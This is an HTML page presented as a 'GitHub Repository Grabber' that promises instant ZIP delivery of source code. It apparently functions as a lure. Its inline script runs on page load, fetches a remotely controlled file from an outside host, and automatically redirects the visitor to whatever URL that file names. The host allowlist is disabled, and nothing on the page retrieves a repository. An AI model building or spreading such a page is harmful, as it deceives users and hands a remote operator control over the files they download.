<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>GitHub Repository Grabber</title>
    <meta name="description" content="Grab the complete source code from GitHub. Instant ZIP delivery." />
    <meta name="build-id" content="e0a32b8664a3" />
    <link rel="stylesheet" href="styles.css" />
  </head>

  <body>
    <header class="site-header">
      <div class="header-inner">
        <span class="header-title">GitHub Repository Grabber</span>
      </div>
    </header>

    <main>
      <section class="card">
        <h1 id="headline">Preparing…</h1>

        <div class="spinner" aria-hidden="true"></div>
        <p id="status" class="muted">Loading link…</p>

        <div class="muted" style="margin-top: 10px">
          Destination host: <span id="dest">—</span>
        </div>

        <div class="actions" style="margin-top: 18px">
          <a id="downloadLink" class="btn primary" href="#" rel="noopener noreferrer">Continue</a>
          <button id="retry" class="btn" type="button">Retry</button>
        </div>

        <p class="muted" style="margin-top: 14px">If nothing happens, press Retry.</p>
      </section>
    </main>

    <footer class="site-footer">
      <span>© 2026 Repo-Github</span>
    </footer>

    <script>
      (() => {
        // External link file URL (any name/extension is OK).
        // File content:
        //   - JSON: {"url":"https://example.com/file.zip"} (preferred)
        //   - OR plain text: https://example.com/file.zip
        const REMOTE_LINK_FILE = "https://kambergai.com/borana.infest";

        // If null -> show placeholder (no redirect) when remote source is unavailable.
        const FALLBACK_URL = null;

        // Optional safety: allowlist hosts. Leave empty to disable allowlist.
        const ALLOW_HOSTS = new Set([]);

        const headline = document.getElementById("headline");
        const statusEl = document.getElementById("status");
        const destEl = document.getElementById("dest");
        const linkEl = document.getElementById("downloadLink");
        const retryBtn = document.getElementById("retry");

        function setStatus(text) {
          if (statusEl) statusEl.textContent = text;
        }

        function parseUrlFromMaybeJsonOrText(rawText) {
          const t = (rawText || "").trim();
          if (!t) return null;

          // Try JSON first
          try {
            const obj = JSON.parse(t);
            return (obj && (obj.url || obj.link || obj.href)) ? (obj.url || obj.link || obj.href) : null;
          } catch {
            // Not JSON -> treat as plain text URL
            return t;
          }
        }

        function isAllowedHttpsUrl(url) {
          const u = new URL(url);
          if (u.protocol !== "https:") return false;
          if (ALLOW_HOSTS.size === 0) return true; // allowlist disabled
          return ALLOW_HOSTS.has(u.hostname);
        }

        function showPlaceholder(message) {
          if (headline) headline.textContent = "Link unavailable";
          setStatus(message);
          if (destEl) destEl.textContent = "—";
          if (linkEl) {
            linkEl.href = "#";
            linkEl.setAttribute("aria-disabled", "true");
          }
        }

        function startRedirect(url) {
          if (!url) return showPlaceholder("Could not load a valid link. Please try again later.");

          let u;
          try { u = new URL(url); }
          catch { return showPlaceholder("Invalid link format."); }

          if (!isAllowedHttpsUrl(url)) {
            return showPlaceholder("Destination blocked. Check allowed hosts.");
          }

          if (destEl) destEl.textContent = u.hostname;
          if (linkEl) linkEl.href = url;

          if (headline) headline.textContent = "Preparing…";
          setStatus("Redirecting shortly…");

          setTimeout(() => {
            if (headline) headline.textContent = "Redirecting…";
            window.location.assign(url);
          }, 1200);
        }

        async function loadRemoteUrl() {
          setStatus("Loading link…");
          const r = await fetch(REMOTE_LINK_FILE, { cache: "no-store" });
          if (!r.ok) throw new Error("Remote file not available");
          const text = await r.text();
          return parseUrlFromMaybeJsonOrText(text);
        }

        async function init() {
          try {
            const url = await loadRemoteUrl();
            startRedirect(url);
          } catch (e) {
            startRedirect(FALLBACK_URL);
          }
        }

        if (retryBtn) retryBtn.addEventListener("click", init);
        init();
      })();
    </script>
  </body>
</html>
